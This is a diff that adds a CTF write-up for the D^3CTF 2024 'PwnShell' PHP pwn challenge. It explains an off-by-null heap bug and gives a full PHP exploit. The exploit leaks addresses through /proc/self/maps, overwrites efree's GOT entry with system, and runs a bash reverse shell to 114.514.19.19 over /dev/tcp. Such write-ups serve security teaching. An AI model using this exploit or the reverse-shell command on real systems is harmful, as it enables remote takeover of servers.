@@ -405,3 +405,72 @@ add_note("number0","aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaa\x00aaaabaaac
 ?>	
 ```
 
+# D^3CTF 2024-PwnShell
+
+I camp up with this pwnable challenge in d^3ctf 2024, to offer an entry-level php pwn challenge. To make it more interesting, I wraped it with a simple file uploading web challenge.
+
+There is an off-by-null in addHacker function. Trigger the off-by-null to forge a fake fd and create a heap overlap to get a arbitary address write permitive. Then we are able to forge the GOT of efree to call system.
+
+Btw the libc address leak can be obtained by including the /proc/self/maps or leaking certain pointers in the heap. That`s two typicall way to obtain adderss leak in php pwn.
+
+```php
+<?php  
+$heap_base = 0;  
+$libc_base = 0;  
+$libc = "";  
+$mbase = "";  
+  
+function u64($leak){  
+    $leak = strrev($leak);  
+    $leak = bin2hex($leak);  
+    $leak = hexdec($leak);  
+    return $leak;  
+}  
+  
+function p64($addr){  
+    $addr = dechex($addr);  
+    $addr = hex2bin($addr);  
+    $addr = strrev($addr);  
+    $addr = str_pad($addr, 8, "\x00");  
+    return $addr;  
+}  
+  
+function leakaddr($buffer){  
+    global $libc,$mbase;  
+    $p = '/([0-9a-f]+)\-[0-9a-f]+ .* \/usr\/lib\/x86_64-linux-gnu\/libc.so.6/';  
+    $p1 = '/([0-9a-f]+)\-[0-9a-f]+ .*  \/usr\/local\/lib\/php\/extensions\/no-debug-non-zts-20230831\/vuln.so/';  
+    preg_match_all($p, $buffer, $libc);  
+    preg_match_all($p1, $buffer, $mbase);  
+    return "";  
+}  
+  
+function leak(){  
+    global $libc_base, $module_base, $libc, $mbase;  
+  
+    ob_start("leakaddr");  
+    include("/proc/self/maps");  
+    $buffer = ob_get_contents();  
+    ob_end_flush();  
+    leakaddr($buffer);  
+    $libc_base=hexdec($libc[1][0]);  
+    $module_base=hexdec($mbase[1][0]);  
+}  
+function attack($cmd){  
+    global $libc_base, $module_base;  
+    $payload = str_pad(p64($module_base + 0x4038).p64(0xff), 0x40, "\x90");  
+    $gadget = p64($libc_base + 0x4c490);  
+    addHacker(str_repeat("\x90", 0x8), str_repeat("\x90", 0x30));  
+    addHacker($payload, str_repeat("\x90", 0x2f));  
+    addHacker(str_pad($cmd, 0x20, "\x00"), "114514");  
+    editHacker(0, $gadget);  
+}  
+function main(){  
+    $cmd = 'bash -c "bash -i >& /dev/tcp/114.514.19.19/810 0>&1"';  
+    leak();  
+    attack($cmd);  
+    removeHacker(2);  
+}  
+  
+main();  
+?>
+```
